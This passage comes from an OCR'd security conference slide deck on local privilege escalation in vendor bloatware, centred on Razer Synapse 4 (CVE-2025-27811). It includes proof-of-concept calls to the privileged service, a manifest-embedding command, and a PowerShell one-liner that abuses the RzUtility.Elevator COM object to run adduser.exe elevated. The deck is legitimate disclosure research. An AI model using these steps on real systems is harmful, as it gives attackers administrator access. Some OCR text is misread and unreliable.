simpleLaunchUserAppProcess(char const* __ptr64, char...
simpleLaunchUserAppProcessNoWait
simpleLaunchUserAppProcessNoWait(char const* __ptr64...
simpleLaunchUserAppElevated
simpleLaunchUserAppElevated(char const* __ptr64, cha..|*
```

## Slide 176

#### `Testing Plan`

- `Load simple_service.dll in my own C++ wrapper`

- `Call methods to test`

- `Use the client JavaScript as argument / flow reference`

\```
Razer Synapse 4
\```

## Slide 177

#### `Testing Plan – POC`

\```
simpleServiceInitialize(initializeCallback);
\```

\```
...
const char *param1 = "Common";
const char *param2 = "C:/users/me/Desktop/adduser.exe";
const char *param3 = "";
\```

\```
simpleLaunchUserAppProcess(
param1, param2, param3, launchCallback
);
\```

\```
Razer Synapse 4
\```

## Slide 178

#### `Testing Plan – POC Paths`

\```
param1 is a folder in:
\```

\```
%APPDATA%\Local\Razer\RazerAppEngine\
User Data\Apps\param1
\```

\```
param2 is a path relative to param1
\```

\```
param1\param2
\```

\```
Razer Synapse 4
\```

## Slide 179

#### `Testing Plan – POC Paths`

\```
simpleLaunchUserAppProcess(
\```

\```
// %APPDATA%\Local\Razer\RazerAppEngine\User Data\Apps\
"Common",
// payload
"adduser.exe",
...
\```

\```
)
\```

\```
Razer Synapse 4
\```

## Slide 180

#### `Testing Plan – POC`

\```
Razer Synapse 4
\```


> Recovered by OCR — confidence 82/100 on the text kept, 76/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
Testing Plan - PUL
[1984 :0222/151415.196:ERROR: apps_service 45)] PostLaunchProcessError: job_id[1] app[Common] file_path[/adduser.exe] p
arams[] error[Error: This PE file is not trusted]
[15848 :0222/151415.196:ERROR:simple_service_d1ll_impl.cc(418)] simpleLaunchUserAppProcessCompleted: error_reason[Error: T
his PE file is not trusted] exit_code[-1]
[15848 :0222/151415.196:INFO:simple_service_d1ll_impl.cc(144)] appsServiceCallbackEvent: callback[00007FF782D31050] event[
{"app":"Common","error":"Error: This PE file is not trusted", "filePath":"/adduser.exe","jobID":"1","params":""}] event[4
Razer Synapse 4
```

## Slide 181

\```
Razer Synapse 4
\```

## Slide 182

\```
Signature Verification... in
the simple_service client DLL!
\```

\```
Razer Synapse 4
\```


> Recovered by OCR — confidence 84/100 on the text kept, 82/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
signature Werification,.. in
Che simple_service client OLL!
uint64_t sub_180044294(int64_t arg1, char* arg2, int64_t* arg3)
180044337 pgActionID.Data4[5] = zmm@.Data4[5];
180044337 pgActionID.Data4[6] = zmm@.Data4[6];
180044337 pgActionID.Data4[7] = zmm@.Data4[7];
180044344 int32_t rax_2 = WinVerifyTrust(-ffffffffffffFFFF, &pgActionID, &var_128) ;
18004434f struct CRYPT_PROVIDER_DATA* rax_3 = WTHelperProvDataFromStateData(*(uint64_t*) ((char*)var_f8)[8]);
180044357 int64_t* rsi_2;
180044357
180044357 if (!rax_3)
180044357 {
1800446bb sub_180068d42(arg3, “Error: This PE file is not trust..", @x22);
1800446c0 rsi_2 = nullptr;
180044357 }
180044357 else
180044357 { Razer Synapse 4
```

## Slide 183

#### `No error, no success?`

\```
Razer Synapse 4
\```


> Recovered by OCR — confidence 78/100 on the text kept, 61/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
Ho eE@rror, no success?
c:\Users\user.PLAK\source\repos\razerpwn\x64\Debug>. \razerpwn.exe
[12624 :0222/152254.762:INFO:simple_service_dll_main.cc(15)] DllMain: Simple Service DLL attached.
[8132:0222/152254.770: INFO:simple_service_dll_impl.cc(14)] simpleServiceInitializeCompleted: callback[00007FF7E7C7107D]
7C7142E]
[12624 :0222/152302.004:INFO:simple_service_dll_main.cc(28)] DllMain: Simple Service DLL detached.
c:\Users\user.PLAK\source\repos\razerpwn\x64\Debug>net user
User accounts for \\USER-PC
Administrator DefaultAccount Guest
user WDAGUtilityAccount
The command completed successfully.
c:\Users\user.PLAK\source\repos\razerpwn\x64\Debug>| Razer Synapse
```

## Slide 184

\```
Running Elevated with a UAC /
SxS Assembly Manifest
\```

\```
Razer Synapse 4
\```


> Recovered by OCR — confidence 78/100 on the text kept, 76/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Running Elevated with a UAC
WebAppIinstaller x +
> “ay © CJ > + UserData > Apps >» Common > WebAppinstaller
G) New » WN Sort » = View v eee
Name Date modified Type
» Home
@ RazerChroma-Web-v4.0.433.exe 2025/02/22 14:46 Application
sigsource.exe 2024/06/27 02:40 Application
@® OneDrive
| pwn.exe 2025/02/13 18:46 Application
```

## Slide 185

\```
Running Elevated with a UAC /
SxS Assembly Manifest
\```

\```
mt.exe \
  -manifest elevated.manifest \
  -outputresource:pwn.exe;#1
\```

\```
Razer Synapse 4
\```

## Slide 186

\```
Local Privilege
Escalation - DEMO
Razer Synapse 4 with razer_elevation_service.exe
v1.1.0.5
\```

## Slide 187


> Recovered by OCR — confidence 81/100 on the text kept, 50/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
BY Windows PowerShell x
PS C:\Users\user.PLAK\Desktop\poc\expLloit> |
```

## Slide 188

#### `LPE, as a one-liner`

\```
Razer Synapse 4
\```

## Slide 189

#### `LPE, as a one-liner`

\```
Razer Synapse 4
\```


> Recovered by OCR — confidence 82/100 on the text kept, 73/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
LE OleView NET v1.11 - 64bit
File Registry Object Security Processes Storage Help
CLSIDs by Se...
Filter: elevation
C:\Program Files\Razer\razer_elevation_service\razer_elevation_service.exe
Elevator Class|
: \Windows \System:
: \Windows \System CLSID Supported Interfaces AppID Service Type Library
: \Windows\system:
: \Windows\system: Name: Elevator Class
:\Windows\System: CLSID: OEDEAF3C-D36E-4E7E-9467-900B977DC4FF
: \Windows\System:
: \Windows\system:
: \Windows\system:
: \Windows\System: CmdLine: "C:\Program Files\Razer\razer_elevation_service\razer_elevation_service.exe"
TreatAs: N/A
Threading Model: Both
RzUtility.Elevator
RzUtility.Elevato...
Server Type: srver32
Server: C:\Program Files\Razer\razer_elevation_service\razer_elevation_service.exe
te
G
```

## Slide 190

#### `LPE, as a one-liner`

\```
$com = New-Object -ComObject 'RzUtility.Elevator'
\```

\```
Razer Synapse 4
\```

## Slide 191

#### `LPE, as a one-liner`

\```
$com = New-Object -ComObject 'RzUtility.Elevator'
$com | Get-Member
TypeName: System.__ComObject#{bfe24d59-6568-4179-8ae5-d9d53869a3e3}
Name                MemberType Definition
\```

\```
----                ---------- ----------
CopyRazerFile       Method     void CopyRazerFile (string, string, string)
GetVersionInfo      Method     void GetVersionInfo (string)
LaunchProcess       Method     void LaunchProcess (string, string, uint, int)
LaunchProcessNoWait Method     void LaunchProcessNoWait (string, string, uint)
\```

\```
Razer Synapse 4
\```

## Slide 192

#### `LPE, as a one-liner`

\```
$com = New-Object -ComObject 'RzUtility.Elevator’
$com | Get-Member
TypeName: System.__ComObject#{bfe24d59-6568-4179-8ae5-d9d53869a3e3}
\```

\```
Name                MemberType Definition
----                ---------- ----------
CopyRazerFile       Method     void CopyRazerFile (string, string, string)
GetVersionInfo      Method     void GetVersionInfo (string)
LaunchProcess       Method     void LaunchProcess (string, string, uint, int)
LaunchProcessNoWait Method     void LaunchProcessNoWait (string, string, uint)
$com.LaunchProcessNoWait("c:\users\user\desktop\adduser.exe", "", 1)
\```

\```
Razer Synapse 4
\```

## Slide 193

#### `LPE, as a one-liner`

\```
(New-Object -ComObject 'RzUtility.Elevator'). `
  LaunchProcessNoWait(`
    "c:\users\user\desktop\adduser.exe ", "", 1 `
)
\```

\```
Razer Synapse 4
\```

## Slide 194

\```
Wrap up
\```

## Slide 195

#### `Failed Attempts`

- `HP Support Assist`

- `Gigabyte Control Center`

- `Lenovo Vantage[0]`

- `And more...`

\```
[0] https://www.atredis.com/blog/2025/7/7/uncovering-privilege-escalation-bugs-in-lenovo-vantage
\```

## Slide 196

#### `The Vulnerabilities`

\```
- 1-click RCE in Asus DriverHub (CVE-2025-3462,
 CVE-2025-3463)
\```

\```
- LPE in MSI Centre (CVE-2025-27812, CVE-2025-27813)
- LPE / RCE in Acer Control Centre (CVE-2025-5491)
- LPE in Razer Synapse 4 (CVE-2025-27811)
\```

## Slide 197

#### `On Disclosure`

- `ASUS vuln disclosure site has a WAF, you can’t send them POC’s.`

- `ASUS strung along another researcher instead of calling a duplicate. I’m sorry MrBruh![0]`

- `MSI responded amazingly fast and were the first to provide a fix.`

- `Razer Bug Bounty Program fronting the security team was frustrating to interact with.`

\```
[0] https://mrbruh.com/asusdriverhub/
\```

## Slide 198

#### `The Pwn Triad`

\```
A privileged service.
An RPC mechanism (TCP, Named Pipe, COM, etc.)
No auth / broken validation / etc.
\```

## Slide 199

#### `Conclusion`

- `Products, built in 2025, are still doing silly RPC things.`

- `Think twice if you need that bloatware.`

- `Do a quick triage of any bloatware you have installed and then uninstall them.`

## Slide 200

#### `POCs`

\```
qrencode \
\```

\```
"https://github.com/sensepost/bloatware-pwn" \
-o - -t UTF8i
\```

## Slide 201

# `Thanks!`

@leonjza
